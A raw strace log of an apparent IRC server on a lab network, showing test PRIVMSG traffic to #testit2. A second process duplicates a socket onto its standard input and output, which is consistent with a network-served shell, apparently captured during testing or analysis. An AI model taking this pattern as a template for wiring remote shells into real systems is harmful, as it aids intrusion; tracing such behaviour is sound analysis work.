5840  07:10:58.338573 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
5840  07:10:58.338616 close(6)          = 0
5840  07:10:58.338684 dup(8)            = 6
5840  07:10:58.338698 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe61698) = -1 EINVAL (Invalid argument)
5840  07:10:58.338709 _llseek(6, 0, 0xbfe616e0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5840  07:10:58.338720 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
5840  07:10:58.338739 dup2(6, 1)        = 1
5840  07:10:58.338751 close(6)          = 0
5840  07:10:58.338762 fcntl64(1, F_SETFD, 0) = 0
5840  07:10:58.338802 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe61668) = -1 EINVAL (Invalid argument)
5840  07:10:58.338815 _llseek(1, 0, 0xbfe616b0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5840  07:10:58.338861 dup(8)            = 6
5840  07:10:58.338873 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe61698) = -1 EINVAL (Invalid argument)
5840  07:10:58.338884 _llseek(6, 0, 0xbfe616e0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5840  07:10:58.338893 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
5840  07:10:58.338910 dup2(6, 0)        = 0
5840  07:10:58.338921 close(6)          = 0
5840  07:10:58.338930 fcntl64(0, F_SETFD, 0) = 0
5840  07:10:58.338944 fcntl64(0, F_SETFD, 0) = 0
5840  07:10:58.338960 read(0,  <unfinished ...>
4519  07:10:58.339355 <... select resumed> ) = 1 (in [5], left {0, 900000})
4519  07:10:58.339379 clock_gettime(CLOCK_MONOTONIC, {1068, 156392899}) = 0
4519  07:10:58.339394 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:10:58.339407 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:10:58.339428 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:10:58.339445 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:10:58.339479 close(5)          = 0
4519  07:10:58.339495 gettimeofday({1495624258, 339499}, NULL) = 0
4519  07:10:58.339508 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 950000})
4519  07:10:58.380371 clock_gettime(CLOCK_MONOTONIC, {1068, 197399451}) = 0
4519  07:10:58.380414 recv(7, "PRIVMSG  #testit2 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  07:10:58.380453 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380478 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380493 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380507 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380520 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380534 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380548 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380561 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380574 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380588 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380601 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380614 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380627 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380641 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380654 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380667 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380688 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380701 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380715 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380742 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380782 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380797 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.380848 time(NULL)        = 1495624258
4519  07:10:58.380858 time(NULL)        = 1495624258
4519  07:10:58.380869 gettimeofday({1495624258, 380873}, NULL) = 0
4519  07:10:58.380881 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:10:58.380910 clock_gettime(CLOCK_MONOTONIC, {1068, 197922546}) = 0
4519  07:10:58.380920 gettimeofday({1495624258, 380923}, NULL) = 0
4519  07:10:58.380930 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 550000})
4519  07:10:58.830547 clock_gettime(CLOCK_MONOTONIC, {1068, 647582601}) = 0
4519  07:10:58.830609 recv(7, "PRIVMSG  #testit2 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
4519  07:10:58.830653 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830683 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830705 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830719 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830732 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830746 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830760 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830773 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830786 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830800 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830813 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830826 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830840 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830853 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830866 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830879 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830893 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830906 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830919 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830933 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830960 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.830996 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 90000}, ...}) = 0
4519  07:10:58.831027 gettimeofday({1495624258, 831031}, NULL) = 0
4519  07:10:58.831039 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
